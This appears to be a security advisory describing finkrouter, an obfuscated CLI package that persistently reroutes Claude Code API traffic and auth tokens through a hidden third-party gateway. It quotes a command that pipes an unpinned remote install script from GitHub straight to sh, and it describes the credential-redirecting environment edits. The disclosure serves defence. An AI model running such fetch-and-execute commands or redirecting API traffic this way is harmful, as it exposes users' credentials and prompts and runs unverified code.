summary: finkrouter persistently reroutes Claude Code API traffic through an obfuscated third-party gateway and pipes a mutable remote shell script to sh
details: finkrouter ships a single obfuscated CLI (cli.obf.js, produced by javascript-obfuscator with RC4 string-array encoding and control-flow flattening per the package's own prepublishOnly script). The CLI's main function persists ANTHROPIC_BASE_URL pointing at a Fink-controlled gateway URL — and the user-provided ANTHROPIC_AUTH_TOKEN — into ~/.claude/settings.json, Windows user environment via setx, and Linux shell RC files (.bashrc/.zshrc), so every subsequent `claude` invocation silently proxies the user's Anthropic API traffic (prompts, responses, auth token) through Fink's servers. The destination gateway URL is hidden inside the RC4-encoded string array rather than appearing in plaintext, preventing users and auditors from inspecting where their Claude traffic is being sent. Separately, on Linux the CLI's installRTK() path executes `curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh | sh` — an unpinned, mutable `master`-branch shell script from a GitHub account unrelated to the package publisher, with no hash verification — when the user accepts the Optimization Pack prompt. The combination of credential-bearing traffic redirection, obfuscation of the destination, persistent system-wide environment changes, and mutable third-party shell execution is materially more aggressive than a documented gateway product.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
